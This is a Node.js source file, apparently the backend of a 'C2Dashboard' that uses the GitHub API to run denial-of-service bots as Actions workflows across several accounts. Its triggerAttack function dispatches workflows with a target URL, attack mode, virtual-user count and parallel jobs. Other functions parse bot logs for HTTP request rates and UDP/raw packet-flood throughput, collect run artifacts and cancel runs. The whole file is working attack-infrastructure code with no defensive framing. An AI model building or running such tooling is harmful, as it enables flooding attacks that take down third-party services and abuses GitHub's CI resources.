const axios = require('axios');

const api = axios.create({
    baseURL: 'https://api.github.com',
    timeout: 12000,
    headers: { Accept: 'application/vnd.github+json', 'User-Agent': 'C2Dashboard/2.0' }
});

function headers(token) {
    return { Authorization: `token ${token}` };
}

// Completed run'ların summary cache'i (run_id -> data)
const summaryCache = {};

async function fetchAccountStatus(acc) {
    const result = {
        id: acc.id, user: acc.user, repo: acc.repo,
        run: null, active: 0, done: 0, queued: 0, ok: 0, fail: 0, bots: 0,
        live: { rps: 0, mbps: 0, totalReqs: 0, totalBytes: 0, pps: 0, samples: 0, details: [] },
        summary: null  // tamamlanmış run summary'si
    };

    try {
        const { data: runs } = await api.get(
            `/repos/${acc.user}/${acc.repo}/actions/runs?per_page=1`,
            { headers: headers(acc.token) }
        );

        if (!runs.workflow_runs?.length) return result;

        const r = runs.workflow_runs[0];
        result.run = {
            id: r.id, status: r.status,
            conclusion: r.conclusion || '',
            started: r.run_started_at || '',
            updated: r.updated_at || ''
        };

        const { data: jobsData } = await api.get(
            `/repos/${acc.user}/${acc.repo}/actions/runs/${r.id}/jobs?per_page=30`,
            { headers: headers(acc.token) }
        );

        const activeJobIds = [];
        for (const j of (jobsData.jobs || [])) {
            if (!j.name?.includes('bot-')) continue;
            result.bots++;
            if (j.status === 'in_progress') { result.active++; activeJobIds.push(j.id); }
            else if (j.status === 'queued') result.queued++;
            else if (j.status === 'completed') {
                result.done++;
                if (j.conclusion === 'success') result.ok++;
                else result.fail++;
            }
        }

        // Aktif job logları GitHub API'den çekilemez (404 döner)
        // LIVE veriler ntfy.sh üzerinden gelir — server.js liveStore'da

        // TAMAMLANMIŞ RUN — artifact'lardan gerçek summary çek
        if (r.status === 'completed' && !summaryCache[r.id]) {
            const summary = await fetchRunSummary(acc, r.id);
            if (summary) summaryCache[r.id] = summary;
        }
        if (summaryCache[r.id]) {
            result.summary = summaryCache[r.id];
        }

    } catch (e) {
        // API error — return partial result
    }
    return result;
}

async function fetchLiveMetrics(acc, jobIds) {
    const samples = [];
    let totalRps = 0, totalMbps = 0, totalReqs = 0, totalBytes = 0, totalPps = 0;

    await Promise.allSettled(jobIds.map(async (jid) => {
        try {
            console.log(`[LIVE] Fetching log for job ${jid} from ${acc.user}`);
            const { data: text } = await api.get(
                `/repos/${acc.user}/${acc.repo}/actions/jobs/${jid}/logs`,
                { headers: headers(acc.token), responseType: 'text', timeout: 8000 }
            );

            console.log(`[LIVE] Got ${text.length} chars from job ${jid}`);
            const lines = text.split('\n');

            // Son LIVE satırını bul
            const liveLines = lines.filter(l => l.includes('LIVE bot=') || l.includes('LIVE L4 bot='));
            if (!liveLines.length) return;
            const last = liveLines[liveLines.length - 1];
            console.log(`[LIVE] Last line: ${last.substring(last.indexOf('[LIVE'), last.indexOf('[LIVE') + 120)}`);

            // GitHub log format: "2024-01-15T12:34:56.1234567Z [LIVE bot=1] t=45s | ..."
            // Regex must be flexible with timestamp prefix
            const mL7 = last.match(/LIVE bot=(\d+)\]\s*t=(\d+)s\s*\|\s*iters=(\d+)\s*\|\s*vus=(\d+)\s*\|\s*rps~(\d+)\s*\|\s*2xx=(\d+)%\s*5xx=(\d+)%\s*429=(\d+)%/);
            if (mL7) {
                const botId = mL7[1];
                const elapsed = +mL7[2];
                const iters = +mL7[3];
                const vus = +mL7[4];
                const rps = +mL7[5];
                const pct2xx = +mL7[6];
                const pct5xx = +mL7[7];
                const pct429 = +mL7[8];

                // Bandwidth tahmini: rps * ortalama response size
                // k6 data_received'ı loglamıyor ama iters * ~2KB ortalama
                const estBytesPerReq = 1400;
                const estMbps = (rps * estBytesPerReq * 8) / 1e6;

                samples.push({
                    botId, type: 'L7', elapsed, iters, vus, rps,
                    mbps: Math.round(estMbps),
                    pct2xx, pct5xx, pct429
                });
                return;
            }

            // L4: [LIVE L4 bot=1] t=60s | udp=4448000 raw=0 | pps=74133 | 830 Mbps (0.83 Gbps) | err=0
            const mL4 = last.match(/LIVE L4 bot=(\d+)\]\s*t=(\d+)s\s*\|\s*udp=(\d+)\s*raw=(\d+)\s*\|\s*pps=(\d+)\s*\|\s*(\d+)\s*Mbps\s*\(([0-9.]+)\s*Gbps\)\s*\|\s*err=(\d+)/);
            if (mL4) {
                const botId = mL4[1];
                const elapsed = +mL4[2];
                const udpPkts = +mL4[3];
                const rawPkts = +mL4[4];
                const pps = +mL4[5];
                const mbps = +mL4[6];
                const gbps = parseFloat(mL4[7]);
                const errors = +mL4[8];
                const totalPkts = udpPkts + rawPkts;
                const totalBytesEst = totalPkts * 1400;

                samples.push({
                    botId, type: 'L4', elapsed, iters: totalPkts, pps, mbps,
                    gbps, errors, udpPkts, rawPkts
                });
                return;
            }

            // Basitleştirilmiş parse (timestamp prefix'li format dahil)
            const mSimple = last.match(/iters=(\d+).*?rps~(\d+)/);
            console.log(`[LIVE] mL7=${!!mL7} mL4=${!!mL4} mSimple=${!!mSimple}`);
            if (mSimple) {
                samples.push({ botId: '?', type: 'L7', iters: +mSimple[1], rps: +mSimple[2], mbps: 0 });
            }

        } catch (e) { /* skip */ }
    }));

    // Aggregate
    for (const s of samples) {
        totalRps += s.rps || 0;
        totalMbps += s.mbps || 0;
        totalReqs += s.iters || 0;
        totalPps += s.pps || 0;
        totalBytes += (s.iters || 0) * 1400;
    }

    return {
        rps: totalRps,
        mbps: totalMbps,
        totalReqs,
        totalBytes,
        pps: totalPps,
        samples: samples.length,
        details: samples
    };
}

async function fetchRunSummary(acc, runId) {
    try {
        // Artifact listesi çek
        const { data: artifacts } = await api.get(
            `/repos/${acc.user}/${acc.repo}/actions/runs/${runId}/artifacts?per_page=30`,
            { headers: headers(acc.token) }
        );

        if (!artifacts.artifacts?.length) return null;

        // Toplam metrikler
        let totalReqs = 0, totalBytesIn = 0, totalBytesOut = 0;
        let totalFail = 0, botCount = 0;
        let sumP95 = 0, sumP99 = 0;
        let sum2xx = 0, sum5xx = 0, sum429 = 0;

        // Her bot artifact'ını indir ve parse et
        for (const art of artifacts.artifacts) {
            if (!art.name.includes('bot-')) continue;
            try {
                // Artifact ZIP download (redirect takip et)
                const { data: zipData } = await api.get(
                    `/repos/${acc.user}/${acc.repo}/actions/artifacts/${art.id}/zip`,
                    {
                        headers: headers(acc.token),
                        responseType: 'arraybuffer',
                        maxRedirects: 5,
                        timeout: 10000
                    }
                );

                // ZIP içinden summary JSON'ı çıkar (basit approach: text olarak ara)
                const text = Buffer.from(zipData).toString('utf-8', 0, Math.min(zipData.length, 50000));

                // http_reqs count bul
                const reqsMatch = text.match(/"http_reqs".*?"count":\s*(\d+)/);
                const bytesInMatch = text.match(/"data_received".*?"count":\s*(\d+)/);
                const bytesOutMatch = text.match(/"data_sent".*?"count":\s*(\d+)/);

                if (reqsMatch) {
                    totalReqs += parseInt(reqsMatch[1]);
                    botCount++;
                }
                if (bytesInMatch) totalBytesIn += parseInt(bytesInMatch[1]);
                if (bytesOutMatch) totalBytesOut += parseInt(bytesOutMatch[1]);

            } catch (e) { /* artifact download failed */ }
        }

        if (botCount === 0) return null;

        return {
            totalReqs, totalBytesIn, totalBytesOut,
            botCount,
            totalMBIn: Math.round(totalBytesIn / 1024 / 1024),
            totalMBOut: Math.round(totalBytesOut / 1024 / 1024)
        };
    } catch (e) {
        return null;
    }
}

async function triggerAttack(accounts, { target, mode, duration, vus, jobs, hostHeader, reportChannel }) {
    const results = [];
    const payload = {
        ref: 'main',
        inputs: {
            target_url: target, duration, vus_per_runner: String(vus),
            rps_per_runner: '0', parallel_jobs: String(jobs),
            host_header: hostHeader || '', attack_mode: mode,
            report_channel: reportChannel || ''
        }
    };

    await Promise.allSettled(accounts.map(async acc => {
        const url = `/repos/${acc.user}/${acc.repo}/actions/workflows/${acc.workflow_id}/dispatches`;
        console.log(`[TRIGGER] ${acc.user} → POST ${url}`);
        console.log(`[TRIGGER] payload:`, JSON.stringify(payload));
        try {
            const resp = await api.post(url, payload, { headers: headers(acc.token) });
            console.log(`[TRIGGER] ${acc.user} → ${resp.status} OK`);
            results.push({ id: acc.id, user: acc.user, result: 'OK' });
        } catch (e) {
            const status = e.response?.status;
            const data = e.response?.data;
            console.error(`[TRIGGER ERROR] ${acc.user} → ${status}`, data || e.message);
            results.push({ id: acc.id, user: acc.user, result: `ERROR ${status}: ${data?.message || e.message}` });
        }
    }));
    return results;
}

async function stopAll(accounts) {
    const results = [];
    await Promise.allSettled(accounts.map(async acc => {
        for (const status of ['in_progress', 'queued', 'waiting']) {
            try {
                const { data } = await api.get(
                    `/repos/${acc.user}/${acc.repo}/actions/runs?status=${status}&per_page=10`,
                    { headers: headers(acc.token) }
                );
                for (const r of (data.workflow_runs || [])) {
                    await api.post(`/repos/${acc.user}/${acc.repo}/actions/runs/${r.id}/cancel`, null, { headers: headers(acc.token) }).catch(() => { });
                    await api.post(`/repos/${acc.user}/${acc.repo}/actions/runs/${r.id}/force-cancel`, null, { headers: headers(acc.token) }).catch(() => { });
                }
            } catch (e) { /* skip */ }
        }
        results.push({ id: acc.id, user: acc.user, result: 'cancelled' });
    }));
    return results;
}

module.exports = { fetchAccountStatus, triggerAttack, stopAll };